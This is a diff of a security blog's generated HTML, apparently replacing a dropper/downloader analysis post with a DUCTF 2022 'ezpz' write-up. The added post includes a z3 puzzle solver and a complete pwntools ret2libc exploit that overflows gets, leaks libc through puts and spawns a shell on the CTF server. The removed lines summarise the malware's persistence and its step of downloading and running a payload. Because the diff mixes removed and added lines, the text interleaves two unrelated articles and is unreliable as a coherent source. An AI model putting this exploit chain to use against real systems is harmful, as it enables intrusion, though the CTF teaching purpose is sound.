+</span>        <span class="k">if</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">store_idx</span><span class="p">)</span> <span class="o">==</span> <span class="n">decoded_value</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span> 
+            <span class="n">count</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="c1"># due to constraint, we can just add the cell value (0 or 1)
+</span>    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+       
+<span class="c1"># detect whether adjacent cells of the puzzle that contains 1 do not contain it as well.
+</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
 
-<ol>
-  <li>If current file modules is not the same as <code class="language-plaintext highlighter-rouge">C:/windows/microsofthelp.exe</code> then create it there. if it fails, then it will attempt to copy itself into that directory and set registry key for persistence</li>
-  <li>if it fails, sleep and try again</li>
-  <li>if it passes, then create a mutex <code class="language-plaintext highlighter-rouge">pomdfghrt</code> and find if there are similar samples. If there are, then delete them</li>
-  <li>Decrypt 0x80 bytes of data with xor key within <code class="language-plaintext highlighter-rouge">.nsp0</code> section</li>
-  <li>Check if <code class="language-plaintext highlighter-rouge">HidePlugin.dll</code> exists in same directory. If not, it will decrypt data and write into it.</li>
-  <li>Load the <code class="language-plaintext highlighter-rouge">HidePlugin.dll</code></li>
-  <li>Connect to internet and get back encrypted response</li>
-  <li>Decrypt and ultimately run via <code class="language-plaintext highlighter-rouge">ShellExecute</code> command.</li>
-</ol>
+        <span class="c1"># used to fit the whole 8 conditions from validPos into a for loop
+</span>        <span class="n">left</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">right</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">left</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="p">((</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])</span><span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)):</span> <span class="c1"># if valid adjacent cell is present
+</span>                <span class="n">count</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[(</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])]</span> 
+
+        <span class="c1"># the muliplying i believe forces the relation with puzzle cells in z3 or anything goes
+</span>        <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">((</span><span class="n">count</span><span class="o">*</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">j</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> 
+
+
+<span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>
+    <span class="n">answer</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span><span class="p">.</span><span class="nf">evaluate</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">)]</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">answer</span><span class="p">:</span>
+        <span class="n">password</span><span class="o">+=</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Problem is unsatisfiable :(</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">pass</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">end program</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">2022.ductf.dev</span><span class="sh">"</span><span class="p">,</span><span class="mi">30005</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Running this will get us the flag if all goes well.</p>
+
+<p><img src="/images/ductf2022ezpz/rev-flag.png" alt="flag" /></p>
+
+<h1 id="ductfgr1d_puzzl3s_ar3_t00_ez_r1ght">DUCTF{gr1d_puzzl3s_ar3_t00_ez_r1ght?}</h1>
 
 <hr />
+
+<h1 id="now-to-the-pwn">Now to the PWN</h1>
+
+<p>So where is the bug? Well, you probably have already noticed that it uses the vulnerable function <code class="language-plaintext highlighter-rouge">gets</code> which allows us to write any buffer length of data into the stack buffer. The only reason we cannot start the pwn challenge immediately is because we do want to exit the program. We need it to get the flag for ezpz-rev and eventually reach the <code class="language-plaintext highlighter-rouge">ret</code> instruction of this function.</p>
+
+<p><img src="/images/ductf2022ezpz/pwnblock.png" alt="pwnblock.png" /></p>
+
+<p>Now that we know the puzzle input to get the flag, we can reach the ret statement after inputting more than 232 characters before do any changes to the instruction pointer. Before continuing, we also know that no canaries is there to block the overflow attempt, no pie is there to mess up the instruction address of the binary and that NX is enabled. This suggest that we can use ROP chain to ret2libc. It is also convenient that the libc used on the server was provided as well.
+<img src="/images/ductf2022ezpz/security.png" alt="security.png" />]</p>
+
+<h2 id="exploit-step-and-script">Exploit Step and Script</h2>
+
+<p>First Stage:</p>
+<ol>
+  <li>Puzzle cells + padding to 232</li>
+  <li>Pop GOT of puts to rdi</li>
+  <li>ret to puts PLT to leak libc of puts  –&gt; puts(puts@GOT)</li>
+  <li>ret the main function  –&gt; restart program</li>
+</ol>
+
+<p>Calculate the libc address based on the offset from the libc file and calculate the address of “/bin/sh” and system</p>
+
+<p>Second Stage:</p>
+<ol>
+  <li>Puzzle cells + padding to 232</li>
+  <li>pop address of “/bin/sh” into rdi</li>
+  <li>ret gadget (to apease MOVAPS in do_system)</li>
+  <li>ret to system PLT  –&gt; system(“/bin/sh”)</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="sh">""</span>
+
+
+<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/lib/x86_64-linux-gnu/libc-2.31.so</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./ezpz</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>   
+    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">2022.ductf.dev</span><span class="sh">"</span><span class="p">,</span> <span class="mi">30005</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">libc-2.35.so</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="c1"># gadgets
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004015d3</span>
+<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x00000000004015d1</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00000000004015d4</span>
+
+
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ezpz</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">OFFSET : </span><span class="sh">"</span> <span class="p">,</span> <span class="n">puts_offset</span><span class="p">)</span>
+<span class="n">putsPLT</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">putsGOT</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
+<span class="n">main_function</span> <span class="o">=</span> <span class="mh">0x00004014A0</span>
+
+<span class="c1">#main_plt = elf.symbols['main']
+</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">putsGOT</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">putsPLT</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">putsGOT : </span><span class="sh">"</span><span class="p">,</span><span class="nf">hex</span><span class="p">(</span><span class="n">putsGOT</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">main_function</span><span class="p">)</span>
+
+
+
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvrepeat</span><span class="p">(</span><span class="mf">0.6</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">ORIGINAL LEAK</span><span class="sh">"</span><span class="p">,</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n\n</span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">8</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">LEAK : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+
+<span class="n">libc_base</span> <span class="o">=</span><span class="p">(</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">puts_offset</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span>
+<span class="n">system_address</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span>  <span class="n">system_offset</span>
+
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">leaked puts libs : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">puts_offset : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">puts_offset</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">libc_base : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Leaked system libc address : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">system_address</span><span class="p">))</span>
+<span class="n">binsh_offset</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">binsh offset : </span><span class="sh">"</span> <span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">binsh_offset</span><span class="p">))</span>
+<span class="n">binsh_address</span> <span class="o">=</span> <span class="n">binsh_offset</span> <span class="o">+</span> <span class="n">system_address</span> <span class="o">-</span> <span class="n">system_offset</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh string found at </span><span class="sh">"</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">binsh_address</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_address</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system_address</span><span class="p">)</span>
+
+<span class="c1">#pause()
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">ls -al</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">cat flag-pwn.txt</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/images/ductf2022ezpz/exploit_flag.png" alt="exploit_flag.png" /></p>
+
+<h1 id="ductfez_r3t2l1bc_9b8a81cda3">DUCTF{ez_r3t2l1bc_9b8a81cda3}</h1>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>I have learnt a lot from and will probably not hesitate (as much) to try z3, I hope … Also, since this is not really a detailed guide to z3, I recommend reading this really tutorial guide from https://ericpony.github.io/z3py-tutorial/guide-examples.htm. It has a lot more inforamtion that I did not really use but it really is beginner friendly!</p>
 
 
     </div>
 
     <div class="post__share">
       <div class="share__list">
-        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://0.0.0.0:4000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://0.0.0.0:4000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
 
-        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=A%20quick%20Look%20at%20a%20Dropper%20and%20Downloader&url=http://0.0.0.0:4000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Trying%20out%20z3%20Solver%20(DUCTF2022%20-%20EZPZ%20RE%20+%20pwn)&url=http://0.0.0.0:4000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
 
-        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://0.0.0.0:4000/2023/03/11/A_quick_peek_at_a_dropper_and_downloader/&amp;media=http://0.0.0.0:4000/images/flash_analysis_1/326d26f624af4b02bae8b528cdce9752.png&amp;description=A%20quick%20Look%20at%20a%20Dropper%20and%20Downloader" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://0.0.0.0:4000/2022/09/25/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/&amp;media=http://0.0.0.0:4000/images/ductf2022ezpz/postpicture.png&amp;description=Trying%20out%20z3%20Solver%20(DUCTF2022%20-%20EZPZ%20RE%20+%20pwn)" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
       </div>
     </div>
 
     <div class="post__navigation">
       
-      <a class="prev" href="/2022/11/12/Flare-on-9_chall_9_and_11/">
-        <img class="post__nav-image lazy" data-src="/images/flareon9_9_11/flare-on9_11.png" alt="Flare-on 9 - Challenge 9 and 11">
+      <a class="prev" href="/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/">
+        <img class="post__nav-image lazy" data-src="/images/windows10shellcodePart2/Windows10Shellcodepart2.png" alt="Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2">
         <div class="post__nav-box">
           <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
-          <h4 class="post__nav__title">Flare-on 9 - Challenge 9 and 11</h4>
+          <h4 class="post__nav__title">Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2</h4>
         </div>
       </a>
       
       
-      <a class="next" href="/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/">
-        <img class="post__nav-image lazy" data-src="/images/alien-saboteaur/backgroundimage.png" alt="Alien Saboteaur - HTB Cyber Apocalyse 2023">
+      <a class="next" href="/2022/11/12/Flare-on-9_chall_9_and_11/">
+        <img class="post__nav-image lazy" data-src="/images/flareon9_9_11/flare-on9_11.png" alt="Flare-on 9 - Challenge 9 and 11">
         <div class="post__nav-box">
           <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
-          <h4 class="post__nav__title">Alien Saboteaur - HTB Cyber Apocalyse 2023</h4>
+          <h4 class="post__nav__title">Flare-on 9 - Challenge 9 and 11</h4>
         </div>
       </a>
       
@@ -572,20 +713,13 @@ C:\vshsn.exe
             
 
             
-            
-            
-            
-
-            
-
-            
 
             <div class="article col col-4 col-d-6 col-t-12 grid__post">
               <div class="article__inner">
 
                 
-                <a class="article__image" href="/2024/05/20/A_quick_peek_at_Black_Wood_DLL_Loader/">
-                  <img class="lazy" data-src="/images/BlackWoodDllLoader/background.png" alt="A Quick Look at BlackWood DLL Loader">
+                <a class="article__image" href="/2024/10/21/TISC2024_Challenge_8_Writeup/">
+                  <img class="lazy" data-src="/images/TISC2024_Chall8_Writeup/owl_with_phone.png" alt="TISC 2024 Challenge 8 (Wallfacer) Writeup">
                 </a>
                 
 
@@ -595,16 +729,16 @@ C:\vshsn.exe
                     <span class="article__minutes">
                       
                       
-                        9 min read
+                        22 min read
                       
                       <time class="article__date"
-                        datetime="2024-05-20T04:56:00+00:00">May 20, 2024</time>
+                        datetime="2024-10-21T09:22:00+00:00">Oct 21, 2024</time>
                     </span>
                   </div>
 
-                  <h2 class="article__title">A Quick Look at BlackWood DLL Loader</h2>
+                  <h2 class="article__title">TISC 2024 Challenge 8 (Wallfacer) Writeup</h2>
 
-                  <p class="article__excerpt">Exploring VXUnderground and chanced upon a DLL Loader from 2024, and so why not take a look at it?</p>
+                  <p class="article__excerpt">APK Challenge from TISC 2024</p>
 
                   <div class="article__bottom">
 
@@ -622,9 +756,9 @@ C:\vshsn.exe
                       <span>in</span>
                       <span class="article-tags">
                         
-                          <a href="/tag/QuickPeek" class="article__tag">QuickPeek</a>
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
                         
-                          <a href="/tag/MalwareAnalysis" class="article__tag">MalwareAnalysis</a>
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
                         
                       </span>
                       
@@ -646,64 +780,13 @@ C:\vshsn.exe
             
 
             
-
-            <div class="article col col-4 col-d-6 col-t-12 grid__post">
-              <div class="article__inner">
-
-                
-                <a class="article__image" href="/2023/09/05/Relocation_Table_and_IAT_Fixing/">
-                  <img class="lazy" data-src="/images/reloc_iat_fixing/backgroundimage.png" alt="Relocation Table and Import Address Table (IAT) in Reflectively Loaded PE File">
-                </a>
-                
-
-                <div class="article__content">
-
-                  <div class="article__meta">
-                    <span class="article__minutes">
-                      
-                      
-                        10 min read
-                      
-                      <time class="article__date"
-                        datetime="2023-09-05T09:22:00+00:00">Sep 5, 2023</time>
-                    </span>
-                  </div>
-
-                  <h2 class="article__title">Relocation Table and Import Address Table (IAT) in Reflectively Loaded PE File</h2>
-
-                  <p class="article__excerpt">A dive into the fixing of Reloc table and IAT by creating a reflective loader.</p>
-
-                  <div class="article__bottom">
-
-                    
-                    <div class="article__author">
-                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
-                    </div>
-                    
-
-                    <div class="article__bottom-meta">
-                      
-                        <a href="/about/" class="article__author-link">MalwareOwl</a>
-                      
-                      
-                      <span>in</span>
-                      <span class="article-tags">
-                        
-                          <a href="/tag/QuickPeek" class="article__tag">QuickPeek</a>
-                        
-                      </span>
-                      
-                    </div>
-                  </div>
-
-                </div>
-
-              </div>
-            </div>
+            
+            
+            
 
             
-                
-              
+
+            
             
             
             
@@ -757,6 +840,73 @@ C:\vshsn.exe
                           <a href="/tag/QuickPeek" class="article__tag">QuickPeek</a>
                         
                           <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2023/03/25/Alien_Saboteaur_HTB_Cyber_Apocalypse_2023/">
+                  <img class="lazy" data-src="/images/alien-saboteaur/backgroundimage.png" alt="Alien Saboteaur - HTB Cyber Apocalyse 2023">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        22 min read
+                      
+                      <time class="article__date"
+                        datetime="2023-03-25T18:45:00+00:00">Mar 25, 2023</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Alien Saboteaur - HTB Cyber Apocalyse 2023</h2>
+
+                  <p class="article__excerpt">A quick writeup on a Virtual Machine Based CTF Challenge.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="MalwareOwl"><img class="article__author-image lazy" data-src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">MalwareOwl</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/Writeups" class="article__tag">Writeups</a>
+                        
+                          <a href="/tag/CTF" class="article__tag">CTF</a>
                         
                       </span>
                       
